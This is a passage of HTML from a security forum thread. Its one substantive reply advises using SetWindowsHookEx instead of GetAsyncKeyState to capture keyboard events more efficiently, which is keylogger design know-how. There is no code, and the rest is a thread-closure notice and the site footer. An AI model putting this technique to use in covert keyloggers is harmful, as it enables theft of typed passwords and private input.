<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="2" />
<span class="post-likes">2 Likes</span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="1" />
</div>
</div>
<div id="post_7" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/Shikigami-V"><span itemprop="name">Shikigami-V</span></a>
(Shikigami-V)
</span>
<link itemprop="mainEntityOfPage" href="34534.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2023-05-15T14:49:38Z" class="post-time">
May 15, 2023, 2:49pm
</time>
<meta itemprop="dateModified" content="2023-05-15T14:49:38Z">
<span itemprop="position">7</span>
</span>
</div>
<div class="post" itemprop="text">
<p>By using <code>GetAsyncKeyState</code> you will be burning the computer’s cpu since you are listening for keyboard event in the background, however if you did this in <code>SetWindowsHookEx</code> you will be hooking the data in the msg loop, which will be a much more relevant approach to eavesdrop keyboard events</p>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="2" />
<span class="post-likes">2 Likes</span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="0" />
</div>
</div>
<div id="post_9" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/system"><span itemprop="name">system</span></a>
(system)
Closed
</span>
<link itemprop="mainEntityOfPage" href="34534.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2023-08-15T13:04:31Z" class="post-time">
August 15, 2023, 1:04pm
</time>
<meta itemprop="dateModified" content="2023-08-15T13:04:31Z">
<span itemprop="position">9</span>
</span>
</div>
<div class="post" itemprop="text">
<p>This topic was automatically closed after 121 days. New replies are no longer allowed.</p>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="0" />
<span class="post-likes"></span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="0" />
</div>
</div>
</div>
</div>
<footer class="container wrap">
<nav class="crawler-nav">
<ul>
<li itemscope itemtype="http://schema.org/SiteNavigationElement">
<span itemprop="name">
<a href="../../index.html" itemprop="url">Home </a>
</span>
</li>
<li itemscope itemtype="http://schema.org/SiteNavigationElement">
<span itemprop="name">
<a href="../../categories.html" itemprop="url">Categories </a>
</span>
</li>
<li itemscope itemtype="http://schema.org/SiteNavigationElement">
<span itemprop="name">
<a href="https://0x00sec.org/guidelines" itemprop="url">FAQ/Guidelines </a>
</span>
</li>
<li itemscope itemtype="http://schema.org/SiteNavigationElement">
<span itemprop="name">
<a href="../../tos.html" itemprop="url">Terms of Service </a>
</span>
</li>
<li itemscope itemtype="http://schema.org/SiteNavigationElement">
<span itemprop="name">
<a href="../../privacy.html" itemprop="url">Privacy Policy </a>
</span>
</li>
</ul>
</nav>
<p class="powered-by-link">Powered by <a href="https://www.discourse.org">Discourse</a>, best viewed with JavaScript enabled</p>
</footer>
<script src="https://instant.page/3.0.0" type="module" defer integrity="sha384-OeDn4XE77tdHo8pGtE1apMPmAipjoxUQ++eeJa6EtJCfHlvijigWiJpD7VDPWXV1"></script>
</body>
</html>
